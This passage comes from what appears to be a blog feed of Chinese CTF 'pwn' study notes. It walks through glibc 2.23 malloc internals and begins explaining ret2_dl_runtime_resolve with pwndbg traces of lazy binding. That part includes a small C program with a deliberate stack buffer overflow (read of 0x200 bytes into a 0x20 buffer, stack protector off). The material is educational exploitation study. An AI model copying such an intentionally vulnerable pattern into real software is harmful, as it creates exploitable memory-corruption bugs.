class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);<span class="comment">//  找到 smallbin 索引</span></span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin) <span class="comment">// 判断 bin 中是不是有 chunk</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">// 链表检查</span></span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb); <span class="comment">//设置下一个chunk的 in_use 位</span></span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     大内存分配，进入 malloc_consolidate</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果申请的 nb 位于 smallbin 的范围，就会 fastbin 一样去找对应的项，然后判断 bin 是不是为空，如果不空, 分配第一个 chunk 给用户，分配之前还会校验该 chunk 是不是正确的。如果为空，就会进入 unsorted bin 的处理了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__glibc_unlikely (bck-&gt;fd != victim)</span><br></pre></td></tr></table></figure><p>如果 nb 不满足 smallbin ，就会触发 malloc_consolidate . 然后进入 unsorted bin</p><h3 id="搜索Unsorted-bin"><a href="#搜索Unsorted-bin" class="headerlink" title="搜索Unsorted bin"></a>搜索Unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="comment">// 遍历 unsorted bin</span></span><br><span class="line">       &#123;</span><br><span class="line">         bck = victim-&gt;bk;</span><br><span class="line">         size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">             bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">             victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">             (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             remainder = chunk_at_offset (victim, nb);</span><br><span class="line">             unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">             av-&gt;last_remainder = remainder;</span><br><span class="line">             remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">             <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">               &#123;</span><br><span class="line">                 remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">             set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                       (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">             set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">             set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>遍历 unsorted bin ， 如果此时的 unsorted bin 只有一项，且他就是 av-&gt;last_remainder ,同时大小满足</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)</span><br></pre></td></tr></table></figure><p>就对当前 unsorted bin 进行切割，然后返回切割后的 unsorted bin 。</p><p>否则就先把该 unsorted bin 从 unsorted list 中移除下来，这里用了一个 类似 unlink 的操作，不过没有检查 chunk 的指针<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*先摘下该 unsorted bin  */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 如果申请的大小和该 unsorted bin的大小刚好相等，就直接返回</span></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p><p>如果申请的大小和该 unsorted bin 的大小刚好相等，就直接返回， 否则就把它放到相应的 bin 里面去。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">              .......</span><br><span class="line">              .......</span><br></pre></td></tr></table></figure></p><h3 id="搜索-Largebin"><a href="#搜索-Largebin" class="headerlink" title="搜索 Largebin"></a>搜索 Largebin</h3><p>接下来就会去搜索 largebin 了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">       &#123;</span><br><span class="line">         bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">         <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">             (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">           &#123;</span><br><span class="line">             victim = victim-&gt;bk_nextsize;</span><br><span class="line">             <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                     (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">               victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                list does not have to be rerouted.  */</span></span><br><span class="line">             <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">               victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Exhaust */</span></span><br><span class="line">             <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">               &#123;</span><br><span class="line">                 set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                 <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                   victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="comment">/* Split */</span></span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                 <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                    have to perform a complete insert here.  */</span></span><br><span class="line">                 bck = unsorted_chunks (av);</span><br><span class="line">                 fwd = bck-&gt;fd;</span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                   &#123;</span><br><span class="line">                     errstr = <span class="string">"malloc(): corrupted unsorted chunks"</span>;</span><br><span class="line">                     <span class="keyword">goto</span> errout;</span><br><span class="line">                   &#125;</span><br><span class="line">                 remainder-&gt;bk = bck;</span><br><span class="line">                 remainder-&gt;fd = fwd;</span><br><span class="line">                 bck-&gt;fd = remainder;</span><br><span class="line">                 fwd-&gt;bk = remainder;</span><br><span class="line">                 <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                   &#123;</span><br><span class="line">                     remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                     remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                 set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                 set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                 set_foot (remainder, remainder_size);</span><br><span class="line">               &#125;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><h3 id="使用-Top-chunk"><a href="#使用-Top-chunk" class="headerlink" title="使用 Top chunk"></a>使用 Top chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line">      <span class="comment">// 如果 top chunk 大小足够大就从 top chunk 里面分配</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果 top chunk 的大小足够就直接切割分配，否则如果此时还有 fastbin 就触发 malloc_consolidate 重复上述流程，如果没有 fastbin 调用 sysmalloc 分配内存</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;文中未做说明 均是指 glibc 2.23&lt;/p&gt;
&lt;h2 id=&quot;简单源码分析&quot;&gt;&lt;a href=&quot;#简单源码分析&quot; class=&quot;hea
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn 知识图谱</title>
    <link href="https://nocbtm.github.io/2020/02/25/pwn-%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/"/>
    <id>https://nocbtm.github.io/2020/02/25/pwn-知识图谱/</id>
    <published>2020-02-25T04:56:05.000Z</published>
    <updated>2020-04-04T12:10:11.469Z</updated>
    
    <content type="html"><![CDATA[<p><img alt="pwn知识图谱.png" data-src="/imgs/pwn_knowledge_map.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img alt=&quot;pwn知识图谱.png&quot; data-src=&quot;/imgs/pwn_knowledge_map.png&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ret2_dl_runtime_resolve学习笔记</title>
    <link href="https://nocbtm.github.io/2020/02/24/ret2_dl_runtime_resolve/"/>
    <id>https://nocbtm.github.io/2020/02/24/ret2_dl_runtime_resolve/</id>
    <published>2020-02-24T10:11:46.000Z</published>
    <updated>2020-04-09T13:12:12.482Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<br><a href="https://www.freebuf.com/articles/system/170661.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/170661.html</a><br><a href="https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more" target="_blank" rel="noopener">https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more</a><br><a href="https://bbs.pediy.com/thread-227034.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-227034.htm</a><br><a href="https://bbs.pediy.com/thread-253833.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-253833.htm</a><br><a href="https://blog.csdn.net/conansonic/article/details/54634142" target="_blank" rel="noopener">https://blog.csdn.net/conansonic/article/details/54634142</a></p><h2 id="前置知识：函数执行流程"><a href="#前置知识：函数执行流程" class="headerlink" title="前置知识：函数执行流程"></a>前置知识：函数执行流程</h2><p>因为程序分为静态链接跟动态链接，因为好多库函数在程序中并不一定都用到，所以在处理动态链接程序的时候，elf文件会采取一种叫做延迟绑定（lazy binding）的技术，也就是当我们位于动态链接库的函数被调用的时候，编译器才会真正确定这个函数在进程中的位置,下面我们通过一个程序来展示这个过程。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc fun.c -fno-stack-protector -m32 -o fun</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,buffer,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fun();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以read函数为例，下断点到read@plt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b *0x80482e0</span></span><br><span class="line">Breakpoint 3 at 0x80482e0</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">►  0x80482e0  &lt;read@plt&gt;                  jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+12] &lt;0x804a00c&gt; </span><br><span class="line"> // 0x804a00c是read的got.plt表地址，里面存放着0x80482e6</span><br><span class="line">   0x80482e6  &lt;read@plt+6&gt;                push   0 // _dl_runtime_resolve第二个参数</span><br><span class="line">   0x80482eb  &lt;read@plt+11&gt;               jmp    0x80482d0</span><br><span class="line">    ↓</span><br><span class="line">   0x80482d0                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; // _dl_runtime_resolve第一个参数</span><br><span class="line">   0x80482d6                              jmp    dword ptr [0x804a008] &lt;0xf7fee000&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7fee000 &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">   0xf7fee001 &lt;_dl_runtime_resolve+1&gt;     push   ecx</span><br><span class="line">   0xf7fee002 &lt;_dl_runtime_resolve+2&gt;     push   edx</span><br><span class="line">   0xf7fee003 &lt;_dl_runtime_resolve+3&gt;     mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7fee007 &lt;_dl_runtime_resolve+7&gt;     mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7fee00b &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe77e0&gt; //执行完_dl_fixup后eax存放着glibc中read函数的地址</span><br><span class="line">   0xf7fee010 &lt;_dl_runtime_resolve+16&gt;    pop    edx</span><br><span class="line">   0xf7fee011 &lt;_dl_runtime_resolve+17&gt;    mov    ecx, dword ptr [esp]</span><br><span class="line">   0xf7fee014 &lt;_dl_runtime_resolve+20&gt;    mov    dword ptr [esp], eax  //把read函数地址存到esp</span><br><span class="line">   0xf7fee017 &lt;_dl_runtime_resolve+23&gt;    mov    eax, dword ptr [esp + 4]</span><br><span class="line">   0xf7fee01b &lt;_dl_runtime_resolve+27&gt;    ret    0xc //返回到 read函数</span><br><span class="line">   0xf7fee01e                             nop</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/4xw 0x804a00c</span></span><br><span class="line">0x804a00c:0x080482e60xf7df45400x000000000x00000000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4xw 0x804a004</span><br><span class="line">0x804a004:0xf7ffd9180xf7fee0000x080482e60xf7df4540</span><br></pre></td></tr></table></figure><p>通过上面一步一步调试，可以清楚看到函数执行流程，call read@plt –&gt;<a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a> –&gt;read@plt+6 –&gt;_dl_runtime_resolve(link_map,rel_offest) –&gt; _dl_fixup –&gt; ret _dl_runtime_resolve+16 –&gt; ret read<br>其中_dl_runtime_resolve函数的两个参数 link_map=0xf7ffd918,rel_offest=0，执行完_dl_runtime_resolve()函数后，就返回到了read函数。</p><p>但绑定的过程是在 _dl_fixup中实现的，接下通过_dl_fixup的源码分析一下函数绑定的实现<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> stack 6</span></span><br><span class="line">00:0000│ esp  0xffffcf04 —▸ 0xf7ffd918 ◂— 0x0</span><br><span class="line">01:0004│      0xffffcf08 ◂— 0x0</span><br><span class="line">02:0008│      0xffffcf0c —▸ 0x8048424 (fun+25) ◂— add    esp, 0x10</span><br><span class="line">03:000c│      0xffffcf10 ◂— 0x0</span><br><span class="line">04:0010│      0xffffcf14 —▸ 0xffffcf20 ◂— 0x8000</span><br><span class="line">05:0014│      0xffffcf18 ◂— 0x200</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xf7fee00b &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe77e0&gt;</span><br><span class="line">        arg[0]: 0xffffcf94 ◂— 0x0</span><br><span class="line">        arg[1]: 0xffffcf70 ◂— 0x1</span><br></pre></td></tr></table></figure><p>借用Veritas501大佬的图更直观的了解这个过程</p><p><img alt="" data-src="/imgs/ret2-dl-runtime-resolve-1.png" class="lozad"></p><h2 id="ELF关于动态链接的一些关键section"><a href="#ELF关于动态链接的一些关键section" class="headerlink" title="ELF关于动态链接的一些关键section"></a>ELF关于动态链接的一些关键section</h2><p>先熟悉一下几个动态链接的一些关键section，以便于分析源码</p><h3 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h3><p>包含了一些关于动态链接的关键信息，在这个fun上它长这样，事实上这个section所有程序都差不多</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08049F14 _DYNAMIC        Elf32_Dyn &lt;1, &lt;1&gt;&gt;      ; DATA XREF: LOAD:080480BC↑o</span><br><span class="line">LOAD:08049F14                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o</span><br><span class="line">LOAD:08049F14                                         ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:08049F1C                 Elf32_Dyn &lt;0Ch, &lt;80482A8h&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:08049F24                 Elf32_Dyn &lt;0Dh, &lt;80484B4h&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:08049F2C                 Elf32_Dyn &lt;19h, &lt;8049F08h&gt;&gt; ; DT_INIT_ARRAY</span><br><span 